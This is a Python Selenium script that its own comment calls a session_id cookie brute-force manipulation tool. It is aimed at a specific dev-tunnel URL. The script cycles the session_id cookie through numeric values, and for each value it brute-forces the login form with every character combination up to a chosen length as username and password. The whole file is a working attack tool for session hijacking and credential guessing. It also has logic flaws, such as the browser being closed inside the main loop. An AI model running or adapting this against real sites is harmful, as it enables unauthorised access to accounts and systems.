from itertools import product
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

#Session_id cookie brute force mainpulation

# Create a WebDriver instance (e.g., Chrome)
driver = webdriver.Chrome()

# Navigate to a website that uses the "session_id" cookie
driver.get("https://s3sg9sx0-8080.use2.devtunnels.ms/")

# Input user preferences
username_input = input("Enter a username (leave blank to brute force): ")
password_input = input("Enter a password (leave blank to brute force): ")
num_chars = int(input("Enter the number of characters to guess (e.g., 2, 3, 4): "))

# Loop through values
for value in range(1000, 1000000):
    # Define the new cookie value
    new_cookie_value = str(value)

    # Get the existing cookie by name
    cookie = driver.get_cookie('session_id')

    if cookie:
        # Change the cookie's value
        cookie['value'] = new_cookie_value

        # Delete the existing cookie
        driver.delete_cookie('session_id')

        # Add the modified cookie to the current session
        driver.add_cookie(cookie)

        # Refresh the page to apply the updated cookie
        driver.refresh()
    else:
        print("Cookie not found")

    # Define character set for usernames and passwords
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-="

    # Loop through character lengths
    for length in range(1, num_chars + 1):
        # Generate all possible combinations of the current length
        combinations = [''.join(p) for p in product(charset, repeat=length)]

        # Loop through each combination based on the user's choice
        for combination in combinations:
            try:
                username_field = driver.find_element(By.XPATH, '//*[@id="username"]')
                password_field = driver.find_element(By.XPATH, '//*[@id="password"]')
                login_button = driver.find_element(By.XPATH, '/html/body/form/input[3]')

                #if username_input is empty, then use the combination   
                if username_input:
                    username_field.clear()
                    username_field.send_keys(username_input)
                else:
                    username_field.clear()
                    username_field.send_keys(combination)

                if password_input:
                    password_field.clear()
                    password_field.send_keys(password_input)
                else:
                    password_field.clear()
                    password_field.send_keys(combination)
                login_button.click()

                print(f"Guess: {combination}")  # Print the current guess
            except:
                driver.refresh()

    # Close the browser when the loop is done
    driver.quit()
